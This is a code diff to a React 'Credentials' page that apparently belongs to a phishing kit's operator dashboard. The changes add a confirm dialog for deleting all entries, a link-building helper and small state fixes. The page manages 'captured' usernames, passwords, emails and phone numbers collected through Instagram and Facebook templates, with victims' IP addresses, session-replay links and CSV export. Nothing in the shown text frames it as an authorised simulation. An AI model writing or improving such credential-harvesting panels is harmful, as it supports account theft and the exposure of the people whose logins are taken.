@@ -2,6 +2,7 @@ import { useEffect, useState, useCallback, useRef, useMemo } from 'react'
 import { api, Session, Credential } from '../api/client'
 import { exportCSV } from '../utils/export'
 import { relativeTime } from '../utils/time'
+import ConfirmDialog from '../components/ConfirmDialog'
 import ErrorBanner from '../components/ErrorBanner'
 import LoadMoreButton from '../components/LoadMoreButton'
 import SessionFilter from '../components/SessionFilter'
@@ -30,6 +31,15 @@ function getCodeParam(): string {
   return new URLSearchParams(window.location.search).get('code') || ''
 }
 
+function dashboardUrl(path: string, sessionId?: string): string {
+  const params = new URLSearchParams()
+  const code = getCodeParam()
+  if (code) params.set('code', code)
+  if (sessionId) params.set('session', sessionId)
+  const query = params.toString()
+  return query ? `${path}?${query}` : path
+}
+
 const TEMPLATES = [
   { id: 'instagram', name: 'Instagram' },
   { id: 'facebook', name: 'Facebook' },
@@ -53,6 +63,8 @@ export default function Credentials() {
   const [hasMore, setHasMore] = useState(true)
   const [loadingMore, setLoadingMore] = useState(false)
   const [paused, setPaused] = useState(false)
+  const [confirmDeleteAll, setConfirmDeleteAll] = useState(false)
+  const [dialogBusy, setDialogBusy] = useState(false)
   const LIMIT = 50
 
   const fetchData = useCallback(async (append = false, useOffset?: number) => {
@@ -66,7 +78,7 @@ export default function Credentials() {
         setCreds(result.entries)
       }
       setTotal(result.total)
-      offsetRef.current = off + (append ? 0 : 0)
+      if (!append) offsetRef.current = off
       setHasMore(result.has_more)
     } catch (e) {
       setError(e instanceof Error ? e.message : 'Failed to load')
@@ -115,14 +127,14 @@ export default function Credentials() {
       setError(null)
       await api.deleteCredential(id)
       setCreds(prev => prev.filter(c => c.id !== id))
+      setTotal(prev => Math.max(0, prev - 1))
     } catch (e) {
       setError('Failed to delete')
     }
   }
 
   const handleDeleteAll = async () => {
-    if (!confirm('Delete ALL captured credentials?')) return
-    if (!confirm('Are you absolutely sure? This cannot be undone.')) return
+    setDialogBusy(true)
     try {
       setError(null)
       await api.deleteAllCredentials()
@@ -131,6 +143,9 @@ export default function Credentials() {
       setHasMore(false)
     } catch (e) {
       setError('Failed to delete all')
+    } finally {
+      setDialogBusy(false)
+      setConfirmDeleteAll(false)
     }
   }
 
@@ -169,7 +184,7 @@ export default function Credentials() {
                 template: c.template_id, ip: c.ip_address, session: c.session_id,
                 date: new Date(c.created_at * 1000).toISOString()
               })), 'credentials.csv')} className="select-apple cursor-pointer">📥 CSV</button>
-              <button onClick={handleDeleteAll} className="select-apple cursor-pointer"
+              <button onClick={() => setConfirmDeleteAll(true)} className="select-apple cursor-pointer"
                 style={{ color: 'var(--accent)' }}>🗑 Delete All</button>
             </>
           )}
@@ -212,7 +227,7 @@ export default function Credentials() {
                       <div className="text-xs text-tertiary flex items-center gap-2 flex-wrap">
                         <span className="mono">{c.template_id}</span>
                         <span>·</span>
-                        <a href={`/?code=${getCodeParam()}#/replay`} className="mono accent hover:underline"
+                        <a href={dashboardUrl('/replay', c.session_id)} className="mono accent hover:underline"
                           title={c.session_id}>{c.session_id.substring(0, 16)}</a>
                       </div>
                     </div>
@@ -247,7 +262,7 @@ export default function Credentials() {
                   </div>
                   <div className="bg-primary radius-card p-2.5">
                     <div className="text-[10px] text-tertiary uppercase tracking-wider">IP Address</div>
-                    <a href={`/?code=${getCodeParam()}#/ips`}
+                    <a href={dashboardUrl('/ips', c.session_id)}
                       className="text-xs accent mono mt-1 block break-all hover:underline"
                       title="View IP logs">{c.ip_address || 'unknown'}</a>
                   </div>
@@ -280,6 +295,17 @@ export default function Credentials() {
           <LoadMoreButton hasMore={hasMore} loading={loadingMore} onLoad={loadMore} />
         </div>
       )}
+
+      <ConfirmDialog
+        open={confirmDeleteAll}
+        title="Delete all credentials?"
+        description="This will permanently remove every captured username, password, email, and phone value. This action cannot be undone."
+        confirmLabel="Delete all"
+        tone="danger"
+        busy={dialogBusy}
+        onClose={() => { if (!dialogBusy) setConfirmDeleteAll(false) }}
+        onConfirm={handleDeleteAll}
+      />
     </div>
   )
 }
